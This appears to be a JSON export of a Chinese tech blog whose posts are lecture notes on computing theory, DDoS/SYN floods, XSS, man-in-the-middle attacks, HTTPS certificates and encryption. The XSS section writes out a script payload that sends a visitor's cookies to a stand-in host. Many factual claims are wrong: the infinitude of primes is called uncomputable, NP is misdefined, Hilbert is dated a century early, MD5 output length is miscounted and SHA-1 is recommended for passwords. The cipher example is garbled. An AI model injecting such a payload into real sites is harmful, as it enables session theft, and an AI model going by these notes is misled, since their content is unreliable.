世纪四五十年代，又发生了第三次科技革命，革命产物是计算机。而第四次科技革命，就发生在当下，出现了人工智能，能源是数据。 说到这里，你可能会有个疑问：第三次科技革命的能源是什么呢？ 你的第一反应可能是电，但是细想又觉得不对。前两次工业革命都有带来能源变革，为什么第三次科技革命就没有了能源变革？其实，第三次科技革命的能源是一种数字能量，本质是计算。 下面我们来看一看这种数字能量是如何产生的。电能供给给芯片，芯片中的一种电子元件晶振（也就是石英晶体）通电后产生震荡，震荡会产生频率稳定的脉冲信号。通常这是一种高频的脉冲信号，每秒可达百万次。然后，我们通过谐振效应发放这个信号，形成方波。再通过电子元件调整这种脉冲的频率，把脉冲信号转换为我们需要的频率，这就形成了驱动芯片工作的时钟信号。这种信号的频率，我们也称作芯片的时钟频率。最后，时钟信号驱动着芯片工作，就像人体的脉搏一样，每一次脉冲到来，都让芯片的状态发生一次变化，用这种方法，最终存储器中的指令被一行行执行。指令被执行，其实就是数据被计算，这就是我说的计算能量。 芯片普及后，不仅给计算机和手机提供支持，它们还被安装到了航天设备、能源设备、医疗设备及通信设备中，甚至小到电灯、微波炉、咖啡机、热水器里面都有了芯片。有了芯片，设备通电后才可以计算，有了计算，这些设备才能够实现更加复杂而精确的功能。 摩尔定律：计算能力的发展值得一提的是，历史上是先有计算机，后有的芯片。世界上第一个芯片，也被称作集成电路， 1958 年由美国德州仪器公司的工程师杰克·基尔比发明。而世界上第一台通用计算机 ENIAC 则是在 1946 年诞生于美国陆军弹道研究实验室。 看到这里你可能会有疑问，为什么是先发明计算机再发明芯片呢？ 其实，这个道理就好比很多程序员先实现产品功能，再考虑封装和复用。ENIAC 中负责计算的模块和后来的芯片原理是一样的，都是利用电路实现逻辑运算。只不过在 20 世纪 40 年代人们还没有将这种能力抽象成一个独立的产品，而且也没有办法解决电路体积的问题，ENIAC的体积看上去就像一所学校那么大。 芯片的计算能力来源于芯片内部的集成电路，集成电路大大减小了电路的体积，所有的元件都是用同一块半导体材料制作而成，也就是把所有的电路都集成到了一个单一的硅片上。为了提高计算性能，集成电路越来越复杂，里面的电子元件也越来越多。从最早拥有 100 个左右晶体管的小型集成电路，发展到 21 世纪初，拥有上亿电子元件的巨大规模集成电路。 芯片的发展，带来了计算能力的飞跃，ENIAC 只能每秒计算 5000 次加法和 400 次乘法，到 1978 年 8086 芯片已经可以每秒计算百万次了。而今天随便一个芯片不但可以轻轻松松每秒计算数亿次，而且不只有一个核心，是多个核心都能达到这一量级的计算能力。 在当时那个年代，Intel 的创始人之一摩尔就观察到了这个现象，并提出了摩尔定律：当价格不变时，集成电路中可容纳的晶体管数目约每隔 18～24 个月就会增加一倍，性能也将提升一倍。这一定律揭示了信息技术发展的速度，但到今天，摩尔定律失效了。因为随着芯片越来越小，在尺寸和散热等方面已经挑战了人类的极限，芯片中无法再放入更多的电子元件了。 但是计算能力又开始以另一种方式发展，比如一个普普通通的 NVIDA 显卡中就拥有了几百个核心，这样就可以进行大量的并发计算；另外，一个分布式的大数据集群，里面就可能有上千个核心。 展望未来，计算能力还有更多的增长点，不仅有可以无限提高计算能力的量子计算机，还有利用光学元件替代晶体元件的光电集成电路。 可计算理论：图灵机来做什么？比如：计算可不可以用来做饭？换一个更专业的说法，做饭可不可以被计算？ 生活在数字时代的我们，用着导航、玩着游戏，本能地知道很多问题是可以被计算的，但是生活在 20 世纪初的科学家们，需要在没有计算机和芯片的时代就想清楚这些问题，并不是一件容易的事情。 公理化体系和不完备性定理最早在 19 世纪初，德国著名数学家希尔伯特提出：这个世界可以建立一套完善的公理体系，由少数几个公理出发，推导出所有的定理和推论。这样就可以逐渐通过这种方法将世界上的万事万物都统一到一个体系中。 当然，这只是一个非常美好的设想，如果万事万物都可以用形式化（简单理解就是程序化规范化）的手段统一到一套体系中，也就意味着计算能力将被无限扩展，只要给定足够的时间和空间，计算机就可以完成任何工作。 但在不久后，美籍数学家哥德尔就提出了哥德尔不完备性定理，内容是：即便在完善的公理体系中仍然可以找到不能被证明也不能被证伪的命题。 这让我联想到，一说谎，鼻子就会变长的匹诺曹。如果他说“我说谎了”，那么他的鼻子应该变长还是变短呢？对于人类而言，这个问题可以理解，但是对于计算机来说这个问题是不可以被计算的。 正是因为世界上存在着大量的这种“公说公有理，婆说婆有理”的问题，才让大家认识到计算不能解决所有问题，所以：计算机能力也是有边界的。哥德尔的不完备性定理，让大家看到了世界上还有大量不可计算的问题。 图灵机和可计算理论于是人们意识到了需要一个理论，专门回答这样的问题：哪些问题可以被计算，哪些不可以被计算，这就是可计算性理论，该理论是计算机科学的理论基础之一。 1936 年，被誉为人工智能之父的阿兰·图灵提出了图灵机，它是一种不断执行指令的抽象计算机。之所以说抽象，是因为图灵并没有真的造出这台机器，而是把它当成理论去和大家探讨可计算问题。 图灵发现如果一个问题是可计算的，那么它的解决方案就必须可以被具化成一条条的指令，也就是可以使用图灵机处理。因此，不能使用图灵机处理的问题，都是不可计算的问题。 比如一个马达的控制程序是可计算的，因为控制过程是可以被抽象成一条条指令的（即可以写程序实现）。比如程序可以先读入传感器的数据，然后根据数据计算出下面要进行加速还是减速。 不可计算问题但当图灵机遇到“素数是不是有无穷多个？”这样的问题时，事情就变得复杂了。虽然，我们可以通过有限的步骤计算出下一个素数。比如可以每次尝试一个更大的数字，然后通过一系列计算过程判断该数字是不是素数，直到找到一个更大的素数。古希腊数学家埃拉托斯特尼就发明了筛选出给定范围内所有素数的方法。 ，我们利用埃拉托斯特尼筛法找到的素数越来越多。但是，我们还是不能回答“素数是不是有无穷多个”这样的问题。因为要回答这样的问题，我们会不停地寻找下一个素数。如果素数是无穷的，那么我们的计算就是无穷无尽的，所以这样的问题不可计算。 停机问题我们也无法实现用一个通用程序去判断另一个程序是否会停止。比如你用运行这段程序来检查一个程序是否会停止时，你会发现不能因为这个程序执行了 1 天，就判定它不会停止，也不能因为这个程序执行了 10 年，从而得出它不会停止的结论。这个问题放到图灵机领域，叫作停机问题，我们无法给出一个判断图灵机是否会停机的通用方法，因此停机问题是一个经典的不可计算问题。 计算能力的边界在哪里？我们可以把世界上想解决的事情都称作问题，解决问题往往需要消耗芯片的计算能力，这通常称作时间开销，另外解决问题还需要消耗内存，称作空间开销。 问题的分类世界上有一类问题，无论我们消耗多少时间和空间也无法解决，这类问题就包括“停机问题”，称作不可计算问题，我们无法用计算机精确地解决这类问题。世界上不可计算问题多，还是可计算问题多，也是一个不可计算问题，但直觉告诉我们一定是不可计算问题更多。 另外在可计算的问题中，有困难问题，也有简单问题，我们通常用复杂度来衡量，比如： “求数组第 10 个元素”，计算这种问题，时间开销、空间开销都不会随着问题规模增长，我们记为 O(1) “求数组中的最大值”，计算这种问题，时间开销会随着数组规模线性增大，记作 O(N)，N 是问题的规模 还有像“求一个n*n矩阵的和”，如果n是规模，那么时间开销会随着问题规模的平方增长，我们称作 O(N2) 当然也有更加复杂的数学模型，比如说O(N3)、O(N4)、O(N100)等 P 问题 vs NP 问题按照摩尔定律所说，人类的计算能力每 18～24 个月翻一倍，我们的计算能力在呈指数形式上升。因此，在所有可以计算的问题中，像 O(N1000)的问题，虽然现在的计算能力不够，但是相信在遥远的未来，我们会拥有能力解决。这种我们有能力解决的问题，统称为多项式时间（ Polynomial time）问题。我们今天能解决的问题，都是多项式时间的问题，下面记为 P 类型的问题。 另外，还有一类问题复杂度本身也是指数形式的问题，比如 O(2N)的问题。这类型的问题随着规模 N 上升，时间开销的增长速度和人类计算能力增长速度持平甚至更快。因此虽然这类问题可以计算，但是当 N 较大时，因为计算能力不足，最终结果依然无法被解决。 由此可见，不是所有可以计算的问题都可以被解决，问题如果不能在多项式时间内找到答案，我们记为 NP 问题。 有一部分 NP 问题可以被转化为 P 问题，比如斐波那契数列求第 N 项，可以用缓存、动态规划等方式转化为 O(N) 的问题。但还有更多的 NP 问题，比如一个集合，找出和为零的子集，就没能找到一个合适的转换方法。其实说这么多，就是想告诉大家：如今还有很多问题无法解决，它的数量远远大于我们可以解决的问题，科学家、工程师们也只能望洋兴叹了。 人工智能此外，包括停机问题、包括 NP 问题在内的很多问题，虽然不能解决，但可以努力让计算机的解决方案超过人类的水平，这就是人工智能。 比如下围棋，围棋盘是 19*19 的，共有 361！种情况，如果遍历 361！种情况，并进行打分，共有 10 的 170 次方种可能，因此，我们的计算能力是远远不足的。但是如果使用人工智能方法对可能出现的部分情况进行概率判断，在不追求绝对精确的情况下，人工智能就可以超过人类选手。 AlphaGo 战胜李世石就是利用了基于概率的不完全解法，这种解法已经可以超过部分人类职业选手了，也就是说计算机的解法已经超过了人类。当然，人类的强项在于理解和分析，人有两种思维，归纳和假设，这两种思维都是计算机无法计算的。机器用概率理解围棋，局部来说机器下得更好，但是人可以制造机器，因此，人的感悟更有意义，谈不上孰优孰劣。 针对这种解决问题的方法，20 世纪中人工智能之父图灵，提出图灵测试，就是在一次人机对话中，随机抽样一部分的实验者和机器对话，如果这部分实验者有较大的百分比判断对面是人而不是机器，那这台机器就通过了图灵测试。在围棋领域，可以说，AI 通过了图灵测试。但围棋的 AI 不能下象棋，这也是 AI 的一个劣势。所以广义的 AI 还没有出现，现在出现的是在某个专业领域的 AI。 总结下面我们进行总结。本课时是一个理解操作系统知识必不可少的计算机原理引导课。 我们学习了芯片，芯片将电能转化为计算能量，计算能量推动程序执行 接着提到了摩尔定律，了解到我们的计算能力仍在飞速发展 还花了篇幅讲了图灵机，从而进一步认识了人工智能之父阿兰·图灵，图灵机具体的设计和构造，这将在02 课时程序的执行部分进一步讨论 最后普及了图灵测试和人工智能的基本概念，带你了解了计算机的能力边界 下面我们回到最初的问题：“可不可以计算一个人程序写得好不好？” 这个问题可以这样来思考，如果把问题降级，变成：“可不可以计算一个人写的程序会不会停机？” 这个问题就如同停机问题，无法计算，因此这是一个不可计算的问题。但是我们通过设立规则，比如检查缩进、检查函数的复用情况、检查类的命名情况，给写程序的人更好的建议。另外，我们也可以通过 AI 技术，让机器在“程序写得好不好”这个问题的判定能力上，达到人类的水平，通过图灵测试。 综上，从绝对的对错角度去看，这是一个不可计算问题，因为它没有办法被完全解决；但是从图灵测试层面来看，虽然目前无法解决这个问题，但是我们有理由相信，在未来，计算机对这个问题的解决方案，是可以超过人类的。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"SYN 拒绝攻击","slug":"计网/SYN拒绝攻击","date":"2021-07-12T16:20:20.000Z","updated":"2021-07-12T08:50:10.914Z","comments":true,"path":"2021/07/13/计网/SYN拒绝攻击/","link":"","permalink":"https://www.shanghua.live/2021/07/13/%E8%AE%A1%E7%BD%91/SYN%E6%8B%92%E7%BB%9D%E6%94%BB%E5%87%BB/","excerpt":"","text":"SYN 拒绝攻击安全无小事。2016 年 DNS 提供商 Dyn 遭遇了一次大规模的 DDoS（分布式拒绝服务攻击），有 14000 个网站域名受到影响。2020 年 7 月份，Twitter 遭大规模攻击，黑客控制了包括马斯克、盖茨、奥巴马等人的 Twitter 账号，诱导用户购买比特币，最终骗取了 11W 美金。2021 年 4 月份，还有黑客利用 Github 的 Actions（Github 的一种 CI/CD 方案），诱导用户进行 git 操作时触发恶意比特币的矿机。 如果一个互联网公司的安全出了故障，那么影响将是巨大的（某知名技术社区的用户名和密码被大规模泄露） 拒绝服务攻击（DOS）拒绝服务攻击（Denial-of-Service Attack,DOS） 虽然目前互联网越来越趋向于正规化，但是对于黑产还有利用 DOS 攻击黑吃黑的现象，比较常见的就是热血传奇这款游戏的私服，搭建一个私服可以获得大额非法收入，但是因为是黑产也会经常受到黑客的攻击。黑客攻击后，再发邮件到管理员邮箱索取金钱，威胁用户不尽快打款就会一直攻击。 在过去，黑产间的攻阀，DoS 就可以作为一种常见武器。DoS 的原理就是利用大量的流量迅速向一个网站发送出去。这种流量可能是应用层的，比如大量 HTTP 请求；也可以是传输层，比如大量的 TCP 请求。比如 2018 年 2 月 18 日，Github 就遭受了一场超大规模的 DoS 攻击，瞬间流量峰值达到了 1.35Tbps。之后，黑客还对 Google、亚马逊等网站也进行了攻击。 攻击者往往没有足够的经济实力购买机器，而是利用中病毒、木马的机器组织流量攻击。这些中病毒的机器，我们俗称“肉鸡”。顶级的黑客往往控制着大量的肉鸡，一声令下，肉鸡就开始疯狂向目标发送网络封包，直到打垮目标。因为肉鸡是分散在世界各地的，因此这种攻击我们也称为分布式拒绝服务攻击（Distributed Denial-of-Service Attack， DDoS）。 DDoS 的种类 直接不停发送 PING 消息的，利用底层的 ICMP 协议，称为 ICMP 攻击 走 UDP 协议的，称为 UDP 洪水（UDP Flood） 不停利用 TCP 协议发送 SYN 消息的，也叫 SYN 攻击 模拟用户行为，不停发帖、浏览帖子、浏览网页、加购物车等，称为挑战黑洞攻击（Challenge Collapsar） 防范措施防火墙会根据特征识别出攻击行为，通过这样对的方式将攻击行为过滤掉，让系统不会因为 DDOS 而过载造成崩溃 进行多活建设：两地三机房，日常生产环境，同城灾备环境，异地灾备环境，CDN 是大量缓存节点，DDOS 攻击 CDN 的时候用不上力，CDN 在解决 DDOS 时也有很好的效果 小团队开业设计一台吞吐量极高的代理服务器，作为反向代理挡在所有流量前面，如果遇到 DDOS ，代理服务器可以识别出一些特征并丢弃一些流量 在遇到攻击的时候，对服务适当降级也是有必要的，通过防火墙造成一部分的误伤来识别更多的攻击流量 跨站脚本攻击（XSS） 2021 年 2 月印度的一名测试工程师在苹果 icloud 官网中发现了一个跨站脚本攻击漏洞，并向苹果提交了具体的漏洞说明和触发的操作步骤 事后，苹果公司给这名印度人发放了 5000 美金的奖金 跨站脚本（Cross Site Scripting）：利用漏洞将脚本注入到网页中，提交个人信息的输入框，如果在服务区没有处理好就有可能触发跨站脚本 假设有一个输入个人签名的多行文本输入框，正常用户输入几句有趣的话，但是黑客可能会尝试输入 1&lt;script&gt;document.createElement(&#x27;img&#x27;).src=&quot;https://some.site.com?cookie=document.cookie&quot;&lt;/script&gt; 如果这段话被显示到用户的个人主页，那么访问这个用户空间的其他用户就会被攻击，进而被黑客拿走 Cookie 中的关键信息。 XSS 攻击模式：想办法向网站的页面上注入脚本，前端框架 React 或 Vue 开发的页面已经基本杜绝了被 XSS 的可能。但是有时候如果工作出现某些疏漏，还是会导致 XSS 的发生。所以正确的做法是上线前拜托安全部门的同学协助进行一些针对 XSS 漏洞的扫描。 中间人攻击我们国家目前在打击网络电信诈骗案中，就有这样一种形式。一些不法分子利用伪基站，比如找一个人多的地方，用自己的伪基站设备伪装成基站，向用户提供网络。一些离不法分子较近的人，手机可能会连接上伪基站。连接上后，不法分子的伪基站就成了你上网的代理，可以进行很多非法操作。因此，从这个角度看，中间人黑进你附近的网络，成为你上网的“代理”，并不是非常难的一件事情。不懂技术的犯罪分子，通过购买伪基站设备，就可以充当中间人。 在遇到中间人攻击时，互联网的信用体系、操作系统、浏览器等就会帮你把好最后一关。比如你访问淘宝购物，中间人向你投放假网页。浏览器就会去验证这个假网页的证书，是不是淘宝的证书。去年 Github 在国内疑似被中间人攻击的案例中，国内很多用户看到的现象是浏览器提示用户浏览的网站不安全。这种情况就是浏览器在校对证书的时候发现了疑点。如果你上网遇到这种情况应该选择立即关闭这个网页，不进行后续的操作，防止被骗。 生活在当今时代，作为个人，网络安全是一件大事，购票信息、出行记录、账号密码、位置信息等，在为公司工作的时候，要保管好自己的账号和工作用的计算机要远离非正规渠道获得的软件 总结生活在当今时代，作为个人，网络安全是一件大事。你的购票信息、出行记录、账号密码、位置信息等，都需要你有防范意识，防止被不法分子拿走。在为公司工作的时候，要保管好自己的账号。特别是你工作用的计算机，要远离非正规渠道获得的软件。你的工作计算机一旦中了木马，成了肉鸡，那不法分子完全可以用你的工作计算机作为跳板，登录公司服务器。 另一方面，作为公司和团队，也要有较强的安全意识。当然，安全领域有自己的专业知识和人才。在互联网产品初期，往往承担不起昂贵的防火墙和雇佣安全专家的费用，这个时候需要开发者主动去学习安全知识，尽可能提升被攻破的成本。当业务发展到一定程度后，就需要马上雇佣安全专家，以及购买包括防火墙在内的网络安全设备。 SYN 攻击是 DDoS 攻击的一种形式。这种形式攻击者伪装成终端不停地向服务器发起 SYN 请求。通常攻击者的肉鸡，发送了 SYN 之后，不等给服务端 ACK，就下线了。 这样攻击者不断发送 SYN ，然后下线，而服务端会等待一段时间（通常会在 3s 以上），等待 ACK。这样就导致了大量的连接对象在服务端被积累。 针对这个特点可以实现一个 TCP 代理（防火墙），发现有发送 SYN 但是不给 ACK 的行为就对目标 IP 地址禁用一段时间。这个策略平时可以配置成开关，等到被攻击的时候打开。另一方面，可以适当提升连接数支持。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"HTTPS 协议","slug":"计网/HTTPS协议","date":"2021-07-12T13:08:19.000Z","updated":"2021-07-12T08:19:40.910Z","comments":true,"path":"2021/07/12/计网/HTTPS协议/","link":"","permalink":"https://www.shanghua.live/2021/07/12/%E8%AE%A1%E7%BD%91/HTTPS%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"HTTPS 协议延续上一讲的内容，我们继续聊解决信用的话题。解决信用，仅仅有加密和解密是不够的。加密解密解决的只是传输链路的安全问题，相当于两个人说话不被窃听。可以类比成你现在生活的世界——货币的信用，是由政府在背后支撑的；购房贷款的信用，是由银行在背后支撑的；你肯购买视频网站的会员，也是由公司的信誉在背后支撑；就连比特币的信用也需要有知名人士（比如马斯克等）在不断喊话…… 我们回到一个很小的问题，你在上网时候，凭什么可以相信你访问的网站没有骗你？今天我们就以这个话题为引，从 HTTPS 协议的信用角度去看互联网的整个信用体系。 摘要和签名现实的生活当中，如果想证明一份合同没有被修改过，人们会在合同上盖一个齐缝章，并附上自己的签名。签名和盖章其实是一个含义，目的是证明自己签署过某份协议，而且一经签署，协议就不能再变更。 如果想阻止一份合同被修改，最容易想到的方式是加密。合同一旦被加密了，要修改就必须原文和密文一起修改。虽然这没有解决最本质的问题——谁来提供信用。但是这样的种做法解决了一个最基础的问题。如果有人想修改合同，就必须知道密钥。 摘要算法但是加密算法的计算量较大，而且结果通常比原文体积大。那是否有其他更好的处理方式呢？其实一个更简单的做法，就是利用摘要算法。摘要，顾名思义，和现实中文章的摘要是一样的。相当于给一篇文章，形成一个提要。只不过，计算机世界的摘要算法算出来的结果并不是对原文真的概括总结，而是一个大数字。 给计算机一篇文章，计算机用摘要算法生成一个字符串 如果文章内容改变，哪怕是一个字，一个标点符号，摘要也会完全改变 和完全加密一篇文章相比，摘要的体积很小，因此非常有利于存储和传输。通常对于一个给定的摘要算法，无论你的文章多大，有多少字节，最终生成摘要的字节数是固定的。以 MD5 摘要算法为例： 12md5(1bit数据)md5(1M数据) 无论数据多大，经过 MD5 计算后，都会形成一个 128 位的值，换算成 16 进制是 16 个字符。可见，摘要算法是比较省空间的，如果用加密算法，那么体积会和原文大小正相关。用 MD5 摘要一个 100M 的视频文件，也会形成只有 128 位的值。 摘要是对原文的证明，从原文到摘要是一个不可逆的过程 通过原文可以计算摘要，一旦原文发生变化，哪怕是一个标点符号，摘要也会发生变化，而通过原文返回摘要，几乎是不可能的。因为摘要和原文并不是一对一的关系，是多个原文对应一个摘要。而且，想要找到两个摘要碰撞的原文是非常困难的发生概率相当于买彩票中大奖 。而且就算黑客找到了碰撞的原文，也未必可以起到作用。当然，摘要碰撞是危险的。 SHA-1 摘要算法目前多数网站用户的密码是以摘要的形式保存的，程序员会经常接触到数据库，而黑客也有可能黑进公司的数据库，因此密码以摘要显示保存更加安全，可以有效防止用户敏感数据被盗，网站设计当中，是不存储用户的密码的，而是只存储用户密码的摘要，如果网站数据库被攻破，但是黑客只能拿到摘要，无法拿到用户密码的原文，因此摘要碰撞是很危险的，因此推荐使用摘要更难碰撞的 SHA-1 摘要算法 摘要算法解决了以下几个问题 为原文生成固定长度的内容证明（内容摘要） 摘要无法被逆向得到原文，看上去是随机的，黑客拿到了也不知道原文 极少概率碰撞：不同的内容极大概率（绝大多数接近 100%）会生成不同的摘要 但是，你要明白，摘要只是一个工具，它可以用来解决很多问题，比如说用户密码存储问题。对于互联网的信用，它还只是工具。 签名摘要的另一个非常重要的用途就是签名。举个例子，张三和李四签署一份合同。 如果张三将合同生成摘要，再用自己的私钥加密摘要，得到一个密文串，那么这个串就是张三对合同的数字签名（DIgital Sign）。 张三生成好数字签名，将自己的公钥、合同原文以及数字签名交给李四保管，就基本上达成了今天我们签约双方交换合同的效果。 你可以这样思考，数字签名是对摘要的加密，因此数字签名本身还拥有摘要能力的。 如果原文没有被修改，那么下面的条件会满足： 1公钥解密（数字签名） == 签订合同时的原文摘要 == 摘要算法（当前原文） == 当前摘要 比如原文被修改，那么可以通过重新计算摘要，对比解密后的数字签名（其实就是早先的摘要）。对张三而言，李四不知道自己私钥，因此他篡改不了自己签名的这份合同。对李四而言，张三无法抵赖自己没有签署过这份合同，因为李四可以拿着张三的公钥解密得到摘要，然后再对比合同原文的摘要。因为是张三私钥加密，如果张三的公钥能解开，那说明就是张三签署的合同。 证书 张三和李四的公钥凭什么具有公信力，谁来证明，张三给李四的公钥，就是张三的公钥；李四给张三的公钥，就是李四的公钥 谁来证明张三和李四，是合法的两个人，具有签署合同的权利 信用的提供最基本问题：信用必须有人提供，权威机构（比如公安局）可以证明张三是张三，李四是李四，同理，互联网世界也需要机构提供证书，由机构证明他们的公钥。这并不是说，张三自己不能制作自己的证书，只不过张三做的证书没有公信力。互联网中，加密算法、签名算法都是公开的，只不过张三自己制作的证书背后没有信用的支持。 证书的制作证书是一个身份证明文件，比如互联网中，经常会为一个域名制作证书。通常的一个域名证书会有一些基础信息： 覆盖的域名 整数的用途 签发时间 到期时间 域名方的公钥 证书的目的：证明身份，让其他人可以使用自己的公钥，权威机构用自己的私钥对整数进行签名，整数上需要增加 3 个信息，权威机构的名称，权威机构的签名，权威机构的网址，有了权威机构的签名，这个证书就合法了 信用链的验证现在问题来了，张三把证书给了李四，李四拿到张三的证书，并看到某权威机构的签名。李四的第一反应就是——这个签名是权威机构的吗？ 计算机产业的底层建筑帮助大家解决了这个问题——这个被称作信用链。 当我们用 HTTPS 协议打开拉勾教育的页面时，这个证书会随着 HTTPS 的握手被下载到本地。浏览器打开证书，发现提供方式 GlobalSign。GlobalSign（Certificate Authority，CA）是一家证书颁发机构。 浏览器并不需要理解 GlobalSign 是谁，在验证过程中，浏览器会查找操作系统中，是否已经安装了 GlobalSign 的证书。如果已经安装了，浏览器就会相信这个证书。操作系统的提供商，比如微软、苹果、谷歌总不会恶意安装非法证书砸自己的招牌。只要用户本机安装了 GlobalSign 证书，那么 GlobalSign 证书的公钥就应该可以解密网站证书的签名，得到网站证书的摘要，那么就可以信任 GlobalSign 签发的这张拉勾的证书。 如果操作系统中没有安装 GlobalSign 的证书该怎么办呢 浏览器会去 GlobalSign 的网站下载证书 浏览器会看 GlobalSign 证书上有没有签发方 如果有，递归进行检查签发方的证书是否安装在操作系统本地，直到找到根证书 根证书的特点是没有其他机构为它签名，操作系统安装的时候，会预装一些证书（根证书），能签发根证书的机构就是根证书提供商，所以不要乱装盗版操作系统。 中间的是中间证书机构，它们自己的证书是由 Root CA 签名颁发的，同时向最底层的终端机构提供证书，犯罪分子如果想要伪造证书，那么它的证书就需要获得中间证书提供商的签名，而获得签名需要购买证书。犯罪分子就算购买了证书，也只能购买自己域名的证书，因此无法伪装成其他网站。但要特别注意的是，如果犯罪分子设法在你的个人电脑上安装了它的根证书，那后果就严重了，它可以冒充成任何网站。 总结总结下，解决信用不是一个数学问题。基于信任关系塑造信用是当今社会的主流做法，比如基于社交关系的信用、基于国家机器的信用、基于公司信誉的信用……另一方面，当然工具也是必不可少的。 摘要，是一种数学的证明，本身体积很小，还不存在密钥管理和分发问题，适合在网络环境中工作。在摘要上用私钥加密就是签名，签名可以防止数据被篡改、伪造等。在摘要和签名的基础上，可以利用原本的社会关系，让一些信用优秀的机构提供信用，这就是证书的颁发和信用链体系。 当用户用浏览器打开一个 HTTPS 网站时，会到目标网站下载目标网站的证书。接下来，浏览器会去验证证书上的签名，一直验证到根证书。如果根证书被预装，那么就会信任这个网站。也就是说，网站的信用是由操作系统的提供商、根证书机构、中间证书机构一起在担保。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"},{"name":"加密","slug":"加密","permalink":"https://www.shanghua.live/tags/%E5%8A%A0%E5%AF%86/"}]},{"title":"对称与非对称加密","slug":"计网/对称与非对称加密","date":"2021-07-11T17:59:49.000Z","updated":"2021-07-12T05:07:48.413Z","comments":true,"path":"2021/07/12/计网/对称与非对称加密/","link":"","permalink":"https://www.shanghua.live/2021/07/12/%E8%AE%A1%E7%BD%91/%E5%AF%B9%E7%A7%B0%E4%B8%8E%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/","excerpt":"","text":"对称与非对称加密在我们平时生活当中，两个人有不想让第三者知道的事情，可以找一个私密的空间去聊。而互联网本身是一个开放的体系，双方在交换数据的时候会经历大量的第三者——公司的防火墙、ISP 的路由器，还有可能有黑客抓取数据。那么这个时候如果张三和李四有私密的话想聊，该怎么办呢？当然是加密传输，想办法让双发传输的数据只有双方才能理解。 对称加密中国古代有藏头诗，比如“拉君时一登，勾芒司节令，教俗养鸡豚，育德德何成”，藏的头就是拉勾教育。如果张三把这首诗通过互联网发送给李四，那么其实张三在和李四说“拉勾教育”。张三把“拉勾教育”写成藏头诗，李四破解藏头诗还原内容，前者叫作数据的加密，后者叫作解密。 但是上面并不是一种很好的加密方式。一方面藏头诗要作诗，诗要押韵，这个消耗计算资源。另一方面，藏头诗数据传输效率太低，5 个字才对应一个字，不可取。还有就是藏头诗太容易被破解，假设已知是藏头诗，那么只需要提取每句的第一个字就好了。 最简单的加密算法假设你要加密数字 1234，假设 x 的补是 10 - x，那么取补就是得到 9876 假设有三种去补操作： 前两个数字取补，后两个不变得到：9834。记做 1 号方案 后两个数字取补，后两个去补，得到 9876，记作为 3 号方案 全部去补，得到 9876,记作 3 号方案 增加两种换序操作，以 1234 为例 相邻数字交换，得到 2143 记作 4 号方案 数据对半交换，得到 3412 记作 5 号方案 可以设计一个加密过程，去补和交换操作交替进行，一共进行 4 次 如果是 1-4-2-5 就代表一种加密顺序，一 1234 为例 前两个数字去补，得到 9834 相邻数据交换，得到 8943 后两个数字去补，得到 8967 数据对半交换得到 6789 解密的时候就可以逆着上述操作即可 数据对半交换得到 8967 后两个数字取补 8943 相邻数据交换 9834 在过程中，对 5 种加密方案的定义、以及约定进行 4 次交替取补、换序操作称为加密算法 1-4-2-5, 在描述是在过程中的具体方案，是秘钥 双方加密解密都用相同的秘钥的算法称之为对称加密算法 在实际的操作过程当中，因为都是针对二进制的操作，取补操作可以用异或操作来代替 在其中的某些步骤可以拿数据和秘钥进行位运计算，具体不同加密算法实现不同 数据加密标准（DES）算法在 1976 年 DES 算法被美国国家标准局定为使用标准，后来被广泛传播，目前已经被证明可以被暴力破解。所谓暴力破解遍历所有可能的秘钥解释数据。举个例子，已知张三和李四传输的是中文，加密算法是 DES，那么拿出一小段数据进行暴力破解，尝试所有的密钥，如果能成功解析出中文词语（词语在词库中可以查到），那么说明破解成功。 DES 采用的是 56 位秘钥，每次计算加密 64 位的数据，一个通用的暴力破解算法需要较大的算力，一些 DES 的破解算法需要 2^39 - 2^46 次操作，目前还没超出人类计算的极限，显卡好一点或者设备强一点就可以破解 所以目前会使用 3 次 DES 操作来增加破解成本 用 3 个 56 位秘钥组合成一个 168 位的秘钥，对数据进行 3 次 DES 的操作，目前针对 3DES 仍然有一些攻击策略，需要 2^90 次计算和 2^88 位内存，虽然有概率攻破，但是成本很高 AES 加密算法为了应对暴力破解等问题，很多团队选择对称加密算法时已经开始使用高级标准（AES），这个加密法用 128 位秘钥，并设计了更难的破解的算法，如果你在项目中需要使用对称加密，即可使用这个算法 对称加密的缺陷如果你是一个网站提供服务给用户，你和用户之间如果使用对称加密，那么需要为每个用户定时生成一个不同的秘钥，如果所有用户使用通用的秘钥，那么一个用户就能通过自己的秘钥获取到其他用户的数据，一个 UV 在 1000W 的网站，如果每天需要给每个用户生成一次秘钥，也就是 1000W 次计算，按照现在集群的能力，每秒做到生成 1000 W个秘钥有什么难度呢？如果客户端不慎遗失秘钥，让黑客拿到的后果呢 黑客可以轻易伪装成客户端和服务器进行通讯 站对称加密中，加密解密用的一个秘钥（加密是正向过程，解密是逆向过程） 非对称加密为了进一步提升安全系数，数学家还提出了非对称加密。在非对称加密中，加密和解密用的不是一个密钥。类比生活中的场景，如果一个礼物箱子，开锁和上锁用的是不同的钥匙会发生什么？只拥有上锁钥匙的人，可以把礼物放到箱子里，但是他只有一次机会，也就是一旦他将礼物上锁，即便反悔了也没法再打开箱子。而收礼物的人只能开箱子取走礼物。如果放礼物的人丢了钥匙，箱子也不会被中间人打开。这个例子类比网络传输的世界，可以防止数据被监听、盗用、篡改…… 当我们开发一个网站，我们的用户之间的通信用非对称加密。用户发送请求时，用户用一把钥匙加密数据，网站用另一把钥匙解密。在这个过程中，网站拥有的钥匙称为私钥，用户拥有的钥匙称为公钥。之所以这样称呼，是因为很多用户可以共用一把公钥，而只有网站才拥有私钥。 公钥发送的数据必须用私钥解密，私钥发送的数据必须使用公钥解密 网站发送数据加密用私钥，用户用公钥解密 用户发送数据用公钥，网站用私钥解密 即使用户公钥被盗，也无法获得私钥解密内容 如果黑客要拿到私钥会怎么做呢？ 雇佣特工潜入物理机房 在该网站员工的机器上植入木马 买通公司内部员工gouk …… 秘钥的创建在非对称加密中，密钥通常由提供服务的一方创建。每次创建是一对公私钥对，然后提供者将公钥给用户，自己保留私钥。值得一提的是，我们在 Linux 环境可以用 openssl 